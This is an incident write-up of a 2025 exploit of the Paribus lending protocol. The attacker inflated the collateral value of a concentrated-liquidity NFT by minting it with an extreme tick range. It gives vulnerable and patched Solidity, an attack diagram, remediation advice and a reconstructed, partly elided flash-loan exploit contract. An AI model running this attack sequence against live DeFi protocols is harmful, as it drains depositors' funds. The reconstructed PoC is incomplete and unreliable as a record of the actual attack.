# Paribus — Concentrated Liquidity NFT Collateral Overvaluation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-22 |
| **Protocol** | Paribus |
| **Chain** | Arbitrum |
| **Loss** | ~$86,000 |
| **Attacker** | [Unidentified](https://arbiscan.io/address/0x0000000000000000000000000000000000000000) |
| **Attack Tx** | [Unidentified](https://arbiscan.io) |
| **Vulnerable Contract** | Paribus lending contract (Arbitrum) |
| **Root Cause** | Collateral valuation logic overestimates the actual value of concentrated liquidity NFTs with extreme tick ranges (-870000~870000), allowing over-borrowing |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/Paribus_exp.sol) |

---

## 1. Vulnerability Overview

Paribus is a protocol that allows Uniswap V3 concentrated liquidity NFT positions to be used as collateral. The attacker flash-borrowed approximately 3,093,209 USDT from Aave, swapped it into PBX tokens, and then minted a Camelot concentrated liquidity NFT with the tick range set to its maximum values (-870000~870000). Although this extreme tick range represents liquidity that is never actually active, Paribus's collateral valuation logic calculated it as having enormous value, allowing the attacker to borrow multiple assets (pETH, pARB, pWBTC, pUSDT).

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: NFT collateral overvaluation with extreme tick range
function getNFTCollateralValue(uint256 tokenId) public view returns (uint256) {
    (
        ,, address token0, address token1,
        , int24 tickLower, int24 tickUpper,
        uint128 liquidity,,,,
    ) = INonfungiblePositionManager(npm).positions(tokenId);

    // Calculates full liquidity as collateral value without validating tick range
    // Unrealistic ranges like tickLower=-870000, tickUpper=870000 are accepted
    uint256 value = calculateLiquidityValue(token0, token1, liquidity);
    return value;
}

// ✅ Safe code: Only counts active liquidity based on current price as collateral
function getNFTCollateralValue(uint256 tokenId) public view returns (uint256) {
    (,,,,, int24 tickLower, int24 tickUpper, uint128 liquidity,,,,)
        = INonfungiblePositionManager(npm).positions(tokenId);

    int24 currentTick = getCurrentTick(pool);
    // Only accept active liquidity where current price is within the tick range
    require(
        tickLower <= currentTick && currentTick <= tickUpper,
        "Inactive position"
    );
    // Discount value proportionally to tick range width
    uint256 rangeWidth = uint256(int256(tickUpper - tickLower));
    require(rangeWidth <= MAX_TICK_RANGE, "Tick range too wide");

    return calculateLiquidityValue(token0, token1, liquidity);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Flash loan 3,093,209 USDT from Aave
  │
  ├─→ [2] Swap USDT → PBX via Camelot Router
  │
  ├─→ [3] Mint concentrated liquidity NFT with extreme tick range
  │         ├─ tickLower: -870,000 (minimum value)
  │         └─ tickUpper: +870,000 (maximum value)
  │         └─ Actual active liquidity: nearly none
  │
  ├─→ [4] Enter Paribus market with NFT (register as collateral)
  │         └─ Paribus: evaluates NFT value far higher than actual
  │
  ├─→ [5] Borrow multiple assets using overvalued collateral
  │         ├─ Borrow large amount of pETH
  │         ├─ Borrow large amount of pARB
  │         ├─ Borrow large amount of pWBTC
  │         └─ Borrow large amount of pUSDT
  │
  ├─→ [6] Convert borrowed assets → USDT
  │
  ├─→ [7] Repay Aave flash loan
  │
  └─→ [8] ~$86,000 profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not available — reconstructed from summary

contract ParibuseAttacker {
    function attack() external {
        // [1] Aave flash loan: 3,093,209 USDT
        IPool(AAVE).flashLoanSimple(
            address(this), USDT, 3_093_209_807_085, "", 0
        );
    }

    function executeOperation(address, uint256, uint256 premium, ...) external returns (bool) {
        // [2] Swap USDT → PBX
        ICamelotRouter(router).swapExactTokensForTokens(...);

        // [3] Mint NFT with extreme tick range (nearly zero real value)
        INonfungiblePositionManager(npm).mint(
            INonfungiblePositionManager.MintParams({
                token0: PBX,
                token1: USDT,
                fee: 3000,
                tickLower: -870_000,  // extreme minimum tick
                tickUpper:  870_000,  // extreme maximum tick
                amount0Desired: pbxBalance,
                amount1Desired: 0,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(this),
                deadline: block.timestamp
            })
        );

        // [4] Register NFT as Paribus collateral
        IParibus(paribus).enterMarkets(nftTokenId);

        // [5] Borrow multiple assets (exploiting overvalued collateral)
        IParibus(paribus).borrow(pETH, ethAmount);
        IParibus(paribus).borrow(pARB, arbAmount);
        IParibus(paribus).borrow(pWBTC, wbtcAmount);
        IParibus(paribus).borrow(pUSDT, usdtAmount);

        // [6~7] Convert and repay Aave
        IERC20(USDT).approve(AAVE, loanAmount + premium);
        return true;
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Collateral Mispricing (NFT Collateral Overvaluation) |
| **CWE** | CWE-682: Incorrect Calculation |
| **Attack Vector** | External (flash loan + manipulated NFT collateral) |
| **DApp Category** | Lending / NFT collateral protocol |
| **Impact** | ~$86,000 drained via over-borrowing |

## 6. Remediation Recommendations

1. **Tick Range Restriction**: Set a maximum allowable tick range and reject NFTs that exceed it as collateral
2. **Active Liquidity Validation**: Only accept positions as collateral when the current price falls within the tick range
3. **Conservative NFT Collateral Valuation**: Apply lower LTV ratios as the tick range widens
4. **Use Independent Price Feeds**: Verify NFT position value using a trusted oracle rather than the protocol's own calculation

## 7. Lessons Learned

- The collateral value of Uniswap V3 concentrated liquidity NFTs varies drastically depending on tick range and current price; they must not be evaluated based solely on raw liquidity figures.
- Designs that permit extreme parameter values (e.g., maximum tick range) are highly susceptible to exploitation by attackers.
- When integrating complex DeFi primitives (NFT collateral, concentrated liquidity), edge cases of each component must be thoroughly analyzed.